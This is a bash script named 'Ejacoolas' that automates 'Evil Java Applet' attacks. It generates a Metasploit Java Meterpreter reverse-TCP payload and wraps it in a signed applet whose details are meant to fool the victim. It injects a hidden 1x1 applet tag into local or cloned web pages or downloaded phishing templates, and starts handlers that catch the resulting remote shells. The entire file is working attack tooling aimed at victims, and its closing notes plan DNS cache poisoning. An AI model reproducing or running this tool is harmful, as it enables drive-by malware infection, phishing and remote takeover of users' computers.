#!/bin/bash

#SOME VARIABLES
version="0.5"
defaultfolder=/root/Ejacoolas/
defaultfolder2=/root/Ejacoolas
ip=`ifconfig | awk -F':' '/inet addr/&&!/127.0.0.1/{split($2,_," ");print _[1]}'`

#CHANGELOG
#v0.5
#-Added the silent mode, for when you really need to do Splinter Cell
#-Added some updating checks, no big deal
#-Added the help option, but I'll not describe it within the help itself cause I'm a dick
#-Added the import option, use it to import the applet that suites the situation
#-Added the discard applet option in main menu
#-Fixed some bugs in IP management
#v0.42
#-Added the template download and infection option
#-Added a signal 2 trap for removing temp files
#-Added some checks during the template download phase
#-The bug fixing continues
#v0.4
#-Added the update feature, thanks to yamas (and Comax) for the great idea!
#-Fixed some typos and bugs
#v0.3 (thanks to Comax for his testing)
#-Initial release, alpha version.
#-Provides only basical features, but hey they work!

#CLEANING FUNCTION

trap quickcleanup 2

quickcleanup() {
echo -e "\n\033[1;31m[!] Caught Ctrl+C, removing temporary files...\n"
rm /tmp/$appletname.rc 2>/dev/null
rm /tmp/$appletname.java 2>/dev/null
rm /tmp/$appletname.class 2>/dev/null
rm /tmp/metasploit.dat 2>/dev/null
rm -R /tmp/metasploit 2>/dev/null
rm -R /tmp/META-INF 2>/dev/null
rm /tmp/mykeystore 2>/dev/null
rm /tmp/$appletname.jar 2>/dev/null
rm -R /tmp/sitetmp 2>/dev/null
rm /tmp/$appletname.handler.sh 2>/dev/null
exit
}

cleanup() {
rm /tmp/$appletname.rc 2>/dev/null
rm /tmp/$appletname.java 2>/dev/null
rm /tmp/$appletname.class 2>/dev/null
rm /tmp/metasploit.dat 2>/dev/null
rm -R /tmp/metasploit 2>/dev/null
rm -R /tmp/META-INF 2>/dev/null
rm /tmp/mykeystore 2>/dev/null
rm /tmp/$appletname.jar 2>/dev/null
rm -R /tmp/sitetmp 2>/dev/null
rm /tmp/$appletname.handler.sh 2>/dev/null
}

#MODES AND OPTIONS

if [[ $1 == "-h" || $2 == "-h" || $3 == "-h" || $1 == "--help" || $2 == "--help" || $3 == "--help" || $4 == "-h" || $4 == "--help" || $5 == "-h" || $5 == "--help" ]]; then
	echo -e "Ejacoolas v$version, by torpedo48

Usage: $0 <options>

Options:
-h  ,	--help			I'm not describing this one, sorry...

-s				Activate Silent Mode (no Internet downloads)

-i <filename> ,			Import an existing Evil Java Applet.
--import <filename>		No new applet will be generated.
		


"
	exit
fi  


if [[ $1 == "-s" || $2 == "-s" || $3 == "-s" ]]; then
	silentmode=1
	echo -e "\033[1;31m[!] Warning: your are running in Silent Mode. No data will be downloaded from the Internet...\n\n\n"
	sleep 3
fi  

#UPDATING FUNCTION
update() {
if [[ $lastavailable > $version ]]; then
	echo "A new version of Ejacoolas is available (v$lastavailable), do you want to update (recommended)? [y|n] (default: \"y\")"
	read userupdate
	if [ $userupdate == "" ]; then
		userupdate="y"
	fi
	case $userupdate in
	n) echo "You don't know what you're missing..."
	sleep 2;;
	y) wget -q http://torpedo48.it/ejacoolas/ejacoolas.sh -O $0
	chmod +x $0
	echo "Update was successfull! Launching the script...\n\n\n\n"
	sleep 2
	$0
	exit;;
	*) echo -e "Please insert just \"y\" or \"n\"...\n"
	update;;
	esac
else	echo -e "Your Ejacoolas is up-to-date, proceeding..."
fi
echo -e "\n\n\n\n"
}

if [ "$silentmode" != "1" ]; then
	echo "Checking if an update is available..."
	wget -q http://torpedo48.it/ejacoolas/info -O /tmp/info
	if [ "$?" != "0" ]; then
		echo -e "\033[0;31m[!] Error while downloading update information...\n\n"
		sleep 3
	else	lastavailable=`cat /tmp/info | grep version`
		lastavailable=`echo ${lastavailable#"version: "}`
		rm /tmp/info
		update
	fi
fi

#GREETINGS
echo -e "
\033[1;31m#############################################################################\033[1;37m
  _____       _      _       ____    ___     ___    _          _      ____  
 | ____|     | |    / \     / ___|  / _ \   / _ \  | |        / \    / ___| 
 |  _|    _  | |   / _ \   | |     | | | | | | | | | |       / _ \   \___ \ 
 | |___  | |_| |  / ___ \  | |___  | |_| | | |_| | | |___   / ___ \   ___) |
 |_____|  \___/  /_/   \_\  \____|  \___/   \___/  |_____| /_/   \_\ |____/ 
                                                                            
\033[1;31m#############################################################################
\033[0;37m                 The Evil Java Applet COOL Automation Script
                         brought to you by torpedo48
                             http://torpedo48.it
                                #############
                If you find a bug or have a suggestion, please
                        contact me: admin@torpedo48.it
              ##################################################
                                    v$version

"

importapplet() {
echo -e "\033[1;37m[...] Importing the specified file into Ejacoolas..."
#importfilename=`basename $importfile | grep jar`
if [ ! -f $importfile ]; then
	echo -e "\033[1;31m[!] Error: the specified file \"$importfile\" does not exist. Exiting...\n"
	sleep 3
	exit
fi
case $importfile in
*.jar)	appletname=`basename $importfile .jar`
	cp $importfile /tmp/ #aggiungi controllo
	imported=1
	echo -e "\033[1;32m[->] Applet \"$appletname.jar\" successfully imported.

\033[1;37mNote that the imported applet had been set with its own IP address and port to contact after the infection. You will not receive any session if your current IP (\"$ip\") is not the one set within the applet, or if your handler is not listening on the applet's port.

Please enter the port used by the imported applet. As already said, if you enter a wrong port Ejacoolas' handler won't work. (default: \"4448\")"
	read userport
	if [ "$userport" == "" ]; then
		port=4448
	else port=$userport #aggiungi un controllo per evitare caratteri non numerici
	fi
	echo -e "\033[1;32m[->] Using port $port for the handler.\n";;
*)	echo -e "\033[1;31m[!] Error: the specified file \"$importfile\" is not a valid JAR file. Exiting...\n"
	sleep 3
	exit;;
esac
}

if [[ $1 == "-i" || $1 == "--import" ]]; then
	importfile="$2"
	importapplet
fi
if [[ $2 == "-i" || $2 == "--import" ]]; then
	importfile="$3"
	importapplet
fi
if [[ $3 == "-i" || $3 == "--import" ]]; then
	importfile="$4"
	importapplet
fi
if [[ $4 == "-i" || $4 == "--import" ]]; then
	importfile="$5"
	importapplet
fi
if [[ $5 == "-i" || $5 == "--import" ]]; then
	importfile="$6"
	importapplet
fi


createapplet() {
#ASK FOR APPLET NAME
echo -e "\033[1;37mPlease insert a name for the applet. Note that this will be shown to the victim when prompted to accept the applet itself. (default: Java_Applet)"
read appletname
if [ "$appletname" == "" ]; then
	appletname=Java_Applet
else appletname=`echo "$appletname" | tr ' ' '_'`
	appletname=`echo "$appletname" | tr [:punct:] '_'`
fi
echo -e "\033[1;32m[->] \"$appletname\" will be used as applet name.\n"

#ASK FOR PAYLOAD SETTINGS
echo -e "\033[1;37m[...] Detecting local IP Address..."
ip=`ifconfig | awk -F':' '/inet addr/&&!/127.0.0.1/{split($2,_," ");print _[1]}'`
if [ "$ip" == "" ]; then
	echo -e "\033[1;31m[!] No IP Address found for this machine. Are you connected to a network?"
	echo -e "\033[1;37mPlease insert your IP Address:"
	read ip
else	echo -e "\033[1;37mIp Address $ip found for this machine. Press ENTER to use it, or specify the IP Address you want to use."
	read userip
	if [ "$userip" != "" ]; then
	ip=$userip
	fi
fi
echo -e "\033[1;32m[->] $ip will be used as local IP Address.\n"

echo -e "\033[1;37mPlease insert the port you want to use for the payload (default: 4448):"
read userport
if [ "$userport" == "" ]; then
	port=4448
else port=$userport #aggiungi un controllo per evitare caratteri non numerici
fi
echo -e "\033[1;32m[->] Using port $port for the payload.\n"

#GENERATE THE PAYLOAD
echo -e "\033[1;37m[...] Generating the Java Meterpreter Reverse_tcp payload..."
echo "use payload/java/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
generate -t jar -f /tmp/$appletname.jar
exit" > /tmp/$appletname.rc
cd /pentest/
msfconsole -r /tmp/$appletname.rc 2>/dev/null
if [[ "$?" != "0" || ! -s /tmp/$appletname.jar ]]; then
	echo -e "\033[1;31m[!] Error encountered while generating the payload, exiting..."
	cleanup
	read userexit
	exit
else echo -e "\033[1;32m[->] Payload successfully generated.\n"
	rm /tmp/$appletname.rc
fi

#ADD THE CLASS FILE
echo -e "\033[1;37m[...] Generating a launcher CLASS file for executing the payload within the applet..."
echo "import java.applet.Applet;
import metasploit.Payload;

public class $appletname extends Applet
{

    public $appletname()
    {
    }

    public void init()
    {
        try
        {
            Payload.main(null);
        }
        catch(Exception exception)
        {
            exception.printStackTrace();
        }
    }
}
" > /tmp/$appletname.java
cd /tmp/

jar -xf ./$appletname.jar
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered during the extraction of the previously generated Jar file, exiting..."
	cleanup
	read userexit
	exit
fi

javac -d /tmp/ -classpath /tmp/ /tmp/$appletname.java
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered while generating the launcher CLASS file, exiting..."
	cleanup
	read userexit
	exit
fi
rm /tmp/$appletname.java 2>/dev/null

jar -uf ./$appletname.jar ./$appletname.class
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered while updating the previously generated jar file with the launcher CLASS file, exiting..."
	cleanup
	read userexit
	exit
else	echo -e "\033[1;32m[->] Jar file successfully updated with the launcher CLASS file.\n"
	rm /tmp/$appletname.class 2>/dev/null
	rm /tmp/metasploit.dat 2>/dev/null
	rm -R /tmp/metasploit 2>/dev/null
	rm -R /tmp/META-INF 2>/dev/null
fi

#SIGN THE JAR
echo -e "\033[1;37m[...] Generating the key and signing the Jar file..."
echo -e "\033[1;37mPlease insert the required data for the Jar file when prompted. Those data will be visible to your victim, so insert something convincing.\n\033[0;37m"

keytool -genkey -alias $appletname -keystore mykeystore -keypass mykeypass -storepass mystorepass
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered while generating the key, exiting..."
	cleanup
	read userexit
	exit
fi

jarsigner -keystore mykeystore -keypass mykeypass -storepass mystorepass /tmp/$appletname.jar $appletname
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered while signing the Jar file with the new key, exiting..."
	cleanup
	read userexit
	exit
else echo -e "\033[1;32m[->] Evil Java Applet successfully generated!\n"
fi

keytool -delete -alias $appletname -keystore mykeystore -keypass mykeypass -storepass mystorepass
if [ "$?" != "0" ]; then
	echo -e "\033[1;31m[!] Error encountered while deleting the used key. However, the applet will properly work: press ENTER to continue..."
	read userexit
fi
rm /tmp/mykeystore 2>/dev/null
}

#OUTPUT

saveapplet () {
echo -e "\033[1;37m\nPlease specify the folder where you want to save the generated applet (default: $defaultfolder), or enter \"back\" to return to previous menu:"
read outputfolder
if [ "$outputfolder" == "back" ]; then
	outputmenu
fi 
if [[ "$outputfolder" == "" || "$outputfolder" == "$defaultfolder2" ]]; then
	outputfolder=$defaultfolder
fi
if [ "$outputfolder" == "$defaultfolder" ]; then
	mkdir $defaultfolder 2>/dev/null
fi
if [ ! -d $outputfolder ]; then
	echo -e "\033[1;31m[!] The specified folder doesn't exist, please retry."
	saveapplet
else	cp /tmp/$appletname.jar $outputfolder/
	if [[ "$?" != "0" || ! -s $outputfolder/$appletname.jar ]]; then
		echo -e "\033[1;31m[!] Error encountered while saving the Evil Java Applet to $outputfolder, saving it to $defaultfolder..."
		outputfolder=$defaultfolder
		mkdir $defaultfolder 2>/dev/null
		cp /tmp/$appletname.jar $outputfolder #AGGIUNGI ULTERIORE CONTROLLO!!!
	fi
	echo -e "\033[1;32m[->] $appletname.jar successfully saved to $outputfolder!\n"
	appletsaved=1
	echo -e "\033[1;37mPress ENTER to return to the main menu...\n"
	read usercontinue
	outputmenu
fi
}

cloneagain() {
echo -e "\033[1;37mDo you want to try entering another URL? If not, you'll return to the main menu. [y|n] (default: \"y\")"
	read userinput3
	if [ "$userinput3" == "" ]; then
		userinput3=y
	fi
	case $userinput3 in
	n) outputmenu;;
	y) clonesite;;
	*) echo -e "Please insert just \"y\" or \"n\"...\n"
		cloneagain;;
	esac 
}

outputpage() {
echo -e "\033[1;37m\nPlease specify the folder where you want to save the infected page and the Evil Java Applet. Existing files with the same names will be overwritten, so be careful! (default: $defaultfolder):"
read userpage
if [[ "$userpage" == "" || "$userpage" == "$defaultfolder2" ]]; then
	userpage=$defaultfolder
fi
if [ "$userpage" == "$defaultfolder" ]; then
	mkdir $defaultfolder 2>/dev/null
fi
if [ ! -d $userpage ]; then
	echo -e "\033[1;31m[!] The specified folder doesn't exist, please retry."
	outputpage
else	mv /tmp/sitetmp/* $userpage/
	if [[ "$?" != "0" || ! -s $userpage/$appletname.jar || ! -s $userpage/index.html ]]; then
		echo -e "\033[1;31m[!] Error encountered while saving the infected page and the Evil Java Applet to $userpage. Saving them to $defaultfolder..."
		userpage=$defaultfolder
		mkdir $defaultfolder 2>/dev/null
		mv /tmp/sitetmp/* $userpage/ #AGGIUNGI ULTERIORE CONTROLLO!!!
	fi
echo -e "\033[1;32m[->] The infected web page along with the Evil Java Applet were successfully moved to $userpage.\n"
echo -e "\033[1;37mPress ENTER to return to the main menu..."
read userexit
savepage="1"
outputmenu
fi
}



infectpage() {
echo -e "\033[1;37m[...] Attempting to infect the web page with the Evil Java Applet..."
cp /tmp/$appletname.jar $pathtoindex/ 2>/dev/null
if [[ "$?" != "0" || ! -s $pathtoindex/$appletname.jar ]]; then
	echo -e "\033[1;31m[!] Error encountered while copying $appletname.jar to $pathtoindex/, you'll have to manually infect the web page (actually in $pathtoindex)with the Evil Java Applet.\n"
	outputmenu
else 	echo "<applet archive="/$appletname.jar" code="$appletname" width="1" height="1"></applet>" >> $pathtoindex/index.html
	if [ "$?" != "0" ]; then
		echo -e "\033[1;31m[!] Error encountered while adding some evil HTML code to $pathtoindex/index.html. You'll have to do that manually.

\033[1;37mThis is the evil HTML code:

\033[0;37m<applet archive="/$appletname.jar" code="$appletname" width="1" height="1"></applet>

\033[1;37mAdd it to $pathtoindex/index.html and it will be infected with the Evil Java Applet. Remember to keep the infected index.html file and \"$appletname.jar\" always in the same folder (actually they're both in $pathtoindex/).\n"
		outputmenu
	else	echo -e "\033[1;32m[->] Web page successfully infected!\n"
	fi
fi
if [ "$localpage" == "1" ]; then
	echo -e "\033[1;37mYou'll find the infected page (\"index.html\") along with the Evil Java Applet in $pathtoindex. Press ENTER to return to the main menu..."
	read userexit
	savepage="1"
	outputmenu
else	outputpage
fi
}

clonesite() {
echo -e "\n\033[1;37mPlease enter the URL to clone (example: http://www.google.com) (enter \"back\" to return to previous menu):"
read cloneurl
if [ "$cloneurl" == "" ]; then
	clonesite
fi
if [ "$cloneurl" == "back" ]; then
	infectmenu
fi
echo -e "\033[1;37m[...] Attempting to clone $cloneurl..."
mkdir /tmp/sitetmp 2>/dev/null
wget --convert-links -w 3 --random-wait --no-dns-cache --referer="http://torpedo48.it" --user-agent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" -P /tmp/sitetmp -erobots=off -q -nH $cloneurl 
if [[ "$?" != "0" || ! -s /tmp/sitetmp/index.html ]]; then
	echo -e "\033[1;31m[!] Error encountered while cloneing URL $cloneurl . An \"index.html\" file couldn't be generated."
	cloneagain
else 	echo -e "\033[1;32m[->] URL $cloneurl successfully cloned to /tmp/sitetmp/.\n"
	pathtoindex=/tmp/sitetmp
	infectpage
fi
}

selectpage() {
echo -e "\n\033[1;37mPlease enter the path to the web page you want to infect. Note that it must be named \"index.html\", or it won't be detected (you'll be able to change its name later). (enter \"back\" to return to previous menu)"
read pathtoindex
if [ "$pathtoindex" == "back" ]; then
	infectmenu
elif [ "$pathtoindex" == "" ]; then
	selectpage
elif [ ! -d $pathtoindex ]; then
	echo -e "\033[1;31m[!] The specified folder doesn't exist, please retry."
	selectpage
elif [ ! -s $pathtoindex/index.html ]; then
	echo -e "\033[1;31m[!] No \"index.html\" file found in $pathtoindex.\n"
	selectpage
else	localpage=1
	echo -e "\033[1;32m[->] \"index.html\" file found in $pathtoindex\n"
	infectpage
fi
}

infectmenu() {
echo -e "\n\033[1;37mDo you want to infect a \033[4ml\033[0m\033[1;37mocal web page or to \033[4mc\033[0m\033[1;37mlone an online web page and infect it (enter \"back\" to return to previous menu)? [l|c|back]"
read userinfectmenu
case $userinfectmenu in
back)	outputmenu;;
l)	selectpage;;
c)	if [ "$silentmode" != "1" ]; then
		clonesite
	else	echo -e "\033[1;31m[!] Warning: Silent Mode is ON. This feature requires data downloading from the Internet. Do you want to proceed? [y|n] (default: \"n\")\033[0;37m"
		read userchoice
		if [ "$userchoice" == "" ]; then
			userchoice=n
		fi
		case $userchoice in
		n) 	outputmenu;;
		y) 	echo -e "\n\n"
			clonesite;;
		*) 	outputmenu;;
		esac
	fi;;
*)	echo -e "Please insert your selection.\n"
	infectmenu;;
esac
}

showcode() {
echo -e "\033[1;37m\nThis is the HTML code you should add to a web page in order to infect it with the Evil Java Applet:

\033[0;37m<applet archive="/$appletname.jar" code="$appletname" width="1" height="1"></applet>

\033[1;37mRemember that it'll work only if your web page and \"$appletname.jar\" reside in the same folder.

You need that code only if you plan to manually infect a web page with the Evil Java Applet: this script can do that for you (hopefully) if you choose option 2 in the menu.

Press ENTER to return to the main menu...\n"
read usercontinue
outputmenu
}

starthandler() {
echo -e "\033[1;37m[...] Starting the handler..."
echo "use exploit/multi/handler
set LHOST $ip
set LPORT $port
set ExitOnSession false
set payload java/meterpreter/reverse_tcp
exploit -j" > /tmp/$appletname.handler.rc
cd /pentest/
msfconsole -r /tmp/$appletname.handler.rc
rm /tmp/$appletname.handler.rc
outputmenu
}

savehandler() {
echo -e "\033[1;37mPlease specify the folder where you want to save the generated handler script (default: $defaultfolder):"
read outputhandler
if [[ "$outputhandler" == "" || "$outputhandler" == "$defaultfolder2" ]]; then
	outputhandler=$defaultfolder
fi
if [ "$outputhandler" == "$defaultfolder" ]; then
	mkdir $defaultfolder 2>/dev/null
fi
if [ ! -d $outputhandler ]; then
	echo -e "\033[1;31m[!] The specified folder doesn't exist, please retry.\n"
	savehandler
else	cp /tmp/$appletname.handler.sh $outputhandler/
	if [[ "$?" != "0" || ! -s $outputhandler/$appletname.handler.sh ]]; then
		echo -e "\033[1;31m[!] Error encountered while saving the Evil Java Applet handler script to $outputhandler, saving it to $defaultfolder..."
		outputhandler=$defaultfolder
		mkdir $defaultfolder 2>/dev/null
		cp /tmp/$appletname.handler.sh $outputhandler #AGGIUNGI ULTERIORE CONTROLLO!!!
	fi
	echo -e "\033[1;32m[->] $appletname.handler.sh successfully saved to $outputhandler!\n"
	handlersaved=1
	echo -e "\033[1;37mPlease note that that handler works only as long as your IP is $ip and your port $port is disposable.

Press ENTER to return to the main menu...\n"
	read usercontinue
	outputmenu
fi
}

createhandler() {
echo -e "\033[1;37m\n[...] Generating the Evil Java Applet handler script..."
echo "echo -e \"\033[1;37m[...] Starting the handler...\"
echo \"use exploit/multi/handler
set LHOST $ip
set LPORT $port
set ExitOnSession false
set payload java/meterpreter/reverse_tcp
exploit -j\" > /tmp/$appletname.handler2.rc
cd /pentest/
msfconsole -r /tmp/$appletname.handler2.rc
rm /tmp/$appletname.handler2.rc" > /tmp/$appletname.handler.sh
chmod +x /tmp/$appletname.handler.sh 2>/dev/null
if [[ "$?" != "0" || ! -s /tmp/$appletname.handler.sh ]]; then
	echo -e "\033[1;31m[!] Error encountered while generating the Evil Java Applet handler script. Press ENTER to return to the main menu..."
	read usercontinue
	outputmenu
else	echo -e "\033[1;32m[->] $appletname.handler.sh successfully generated!\n"
	savehandler
fi
}

templatesave() {
echo -e "\033[1;37m\nPlease specify the folder where you want to save the infected template page. Existing files with the same names will be overwritten, so be careful! (default: $defaulttemplatedir):"
read userpage
if [[ "$userpage" == "" || "$userpage2" == "$defaulttemplatedir2" ]]; then
	userpage=$defaulttemplatedir
fi
if [ "$userpage" == "$defaulttemplatedir" ]; then
	mkdir $defaultfolder 2>/dev/null
	mkdir $defaulttemplatedir 2>/dev/null
fi
if [ ! -d $userpage ]; then
	echo -e "\033[1;31m[!] The specified folder doesn't exist, please retry."
	templatesave
else	mv $templatetmp/* $userpage/
	if [[ "$?" != "0" || ! -s $userpage/$appletname.jar || ! -s $userpage/index.html ]]; then
		echo -e "\033[1;31m[!] Error encountered while saving the infected page and the Evil Java Applet to $userpage. Saving them to $defaulttemplatedir..."
		userpage=$defaulttemplatedir
		mkdir $defaulttemplatedir 2>/dev/null
		mv $templatetmp/* $userpage/ #AGGIUNGI ULTERIORE CONTROLLO!!!
	fi
fi
echo -e "\033[1;32m[->] The infected template page along with the Evil Java Applet were successfully moved to $userpage.\n"
echo -e "\033[1;37mPress ENTER to return to the main menu..."
read userexit
rm -R $templatetmp
savepage="1"
outputmenu
}

templateselection() {
templatefile=/tmp/templatestmp
echo -e "\033[1;37m[...] Looking for templates at torpedo48.it..."
wget -q http://torpedo48.it/phishing/templates -O $templatefile 
if [ ! -s $templatefile ]; then 
	echo -e "\033[1;31m[!] Error encountered while connecting to the database, returning to the main menu..."
	sleep 3
	echo -e "\n\n\n"
	outputmenu
else	echo -e "\n"
fi
numbers=`awk '{print $1}' $templatefile`
templatetmp=/tmp/t48_tmplt
echo -e "\033[1;37m\nPlease select the template you want to use. Use the provided link for every template to see how it looks.\n"

for number in $numbers
do
	description[$number]=`grep "^$number" $templatefile | awk '{print $2}' | tr '.' ' '`
	descriptionpoint[$number]=`grep "^$number" $templatefile | awk '{print $2}'`
	filename[$number]=`grep "^$number" $templatefile | awk '{print $3}'`
	archive[$number]=`grep "^$number" $templatefile | awk '{print $4}'`
	url[$number]=`grep "^$number" $templatefile | awk '{print $5}'`
	echo "[$number]- ${description[$number]}
	(example link: ${url[$number]})"
done
echo "[99]- Back to main menu"
tot=$number
read selecttemplate
if [ "$selecttemplate" == "99" ]; then
	echo -e "\n\n\n"
	outputmenu
elif [[ $selecttemplate -gt $tot || $selecttemplate -lt 1 ]]; then
	echo -e "That's not an option, please try again...\n\n"
	templateselection
fi
for number in $numbers
do
	if [ "$selecttemplate" == "$number" ]; then
		echo -e "\033[1;37m\n[...] Downloading the selected template..."
		mkdir $templatetmp 2>/dev/null
		if [ ! -d $templatetmp ]; then
			echo -e "\033[1;31m[!] Error encountered while creating the temporary folder in /tmp/, returning to the main menu...\n\n\n"
			sleep 3
			outputmenu
		fi	
		wget -P $templatetmp/ -q ${filename[$number]} -O $templatetmp/${archive[$number]}
		if [ "$?" != "0" ]; then
			echo -e "\033[1;31m[!] Error encountered while downloading the template from torpedo48.it, returning to the main menu...\n\n\n"
			sleep 3
			outputmenu
		fi
		echo -e "\033[1;37m\n[...] Extracting the compressed file...\n"
		cd $templatetmp
		tar -xzf $templatetmp/${archive[$number]}
		if [ "$?" != "0" ]; then
			echo -e "\033[1;31m[!] Error encountered while extracting the downloaded archive, returning to the main menu...\n\n\n"
			sleep 3
			outputmenu
		fi
		rm $templatetmp/${archive[$number]}
		echo -e "\033[1;37m[...] Attempting to infect the web page with the Evil Java Applet..."
		cp /tmp/$appletname.jar $templatetmp/ 2>/dev/null
		if [[ "$?" != "0" || ! -s $templatetmp/$appletname.jar ]]; then
			echo -e "\033[1;31m[!] Error encountered while copying $appletname.jar to $templatetmp/, you'll have to manually infect the web page (actually in $templatetmp)with the Evil Java Applet.\n"
			outputmenu
		else 	echo "<applet archive="/$appletname.jar" code="$appletname" width="1" height="1"></applet>" >> $templatetmp/index.html
			if [ "$?" != "0" ]; then
			echo -e "\033[1;31m[!] Error encountered while adding some evil HTML code to $templatetmp/index.html. You'll have to do that manually.

\033[1;37mThis is the evil HTML code:

\033[0;37m<applet archive="/$appletname.jar" code="$appletname" width="1" height="1"></applet>

\033[1;37mAdd it to $templatetmp/index.html and it will be infected with the Evil Java Applet. Remember to keep the infected index.html file and \"$appletname.jar\" always in the same folder (actually they're both in $templatetmp/).\n"
				outputmenu
			else	echo -e "\033[1;32m[->] Web page successfully infected!\n"
			fi
		fi
		defaulttemplatedir=/root/Ejacoolas/${descriptionpoint[$number]}
		defaulttemplatedir2=/root/Ejacoolas/${descriptionpoint[$number]}/
		rm $templatefile
		templatesave
	fi
done
}

outputmenu() {
localpage="0"
echo -e "\033[1;37m\nWhat do you want to do now?\n"

if [ "$appletsaved" != "1" ]; then
		echo -e "\033[1;37m[1]- Save the Evil Java Applet to a directory for future use"
	else	echo -e "\033[1;37m[1]- \033[1;9;37mSave the Evil Java Applet to a directory for future use\033[0m"
fi
if [ "$savepage" != "1" ]; then
		echo -e "\033[1;37m[2]- Infect a web page (local or cloned) with the Evil Java Applet"
	else	echo -e "\033[1;37m[2]- Infect another web page (local or cloned) with the Evil Java Applet"
fi
echo -e "\033[1;37m[3]- Download a phishing template from torpedo48.it and infect it"
echo -e "\033[1;37m[4]- Show the HTML code that triggers the Evil Java Applet"
echo -e "\033[1;37m[5]- Start an Evil Java Applet handler"
echo -e "\033[1;37m[6]- Create a script for starting an Evil Java Applet handler"
echo -e "\033[1;37m[7]- Discard current Applet and create a new one"
echo -e "\033[1;37m[9]- Exit from Ejacoolas"
echo -e "\n"
read usermenu
case $usermenu in
1)	if [ "$appletsaved" != "1" ]; then
		saveapplet
	else	echo -e "$appletname.jar already saved to $outputfolder!\n"
		outputmenu
	fi;;
2)	infectmenu;;
3)	if [ "$silentmode" != "1" ]; then
		templateselection
	else	echo -e "\033[1;31m[!] Warning: Silent Mode is ON. This feature requires data downloading from the Internet. Do you want to proceed? [y|n] (default: \"n\")\033[0;37m"
		read userchoice
		if [ "$userchoice" == "" ]; then
			userchoice=n
		fi
		case $userchoice in
		n) 	outputmenu;;
		y) 	echo -e "\n\n"
			templateselection;;
		*) 	outputmenu;;
		esac
	fi;;
4)	showcode;;
5)	starthandler;;
6)	createhandler;;
7)	echo -e "\033[1;31m[!] Warning: do you really want to discard the current Evil Java Applet? [y|n] (default: \"n\")\033[0m"
	read discardapplet
	if [ "$discardapplet" == "" ]; then
			discardapplet="n"
	fi
	case $discardapplet in
	y) 	rm /tmp/$appletname.jar 2>/dev/null
		appletsaved=0
		savepage=0
		echo -e "\n\n"
		createapplet
		outputmenu;;
	n)	outputmenu;;
	*)	outputmenu;;
	esac;;
9)	if [[ "$appletsaved" == "1" || "$savepage" == "1" ]]; then
		cleanup
		exit
	else 	echo -e "\033[1;31m[!] Warning: you haven't exported your applet yet. If you exit now, it will be deleted. Do you really want to exit? [y|n] (default: \"n\")\033[0m"
		read userexit2
		if [ "$userexit2" == "" ]; then
			userexit2="n"
		fi
		case $userexit2 in
		y) 	cleanup
			exit;;
		n)	outputmenu;;
		*)	outputmenu;;
		esac
	fi;;
*)	echo -e "Please insert a valid selection.\n"
	outputmenu;;
esac
}

if [ "$imported" == "1" ]; then
	outputmenu
else	createapplet
	outputmenu
fi


###NOTES

#AGGIUNGI AL CODICE HTML DELL'APPLET IL REDIRECT ALLA PAGINA ORIGINALE, CHE FA FIGO!!
#AGGIUNGI TRUE ONLINE MODE (WAN MODE)
#AGGIUNGI LO SPOSTAMENTO AUTOMATICO IN var/www e L'AVVIO DI APACHE
#AGGIUNGI UNA MODALITà DNS CACHE POISONING AUTOMATICA

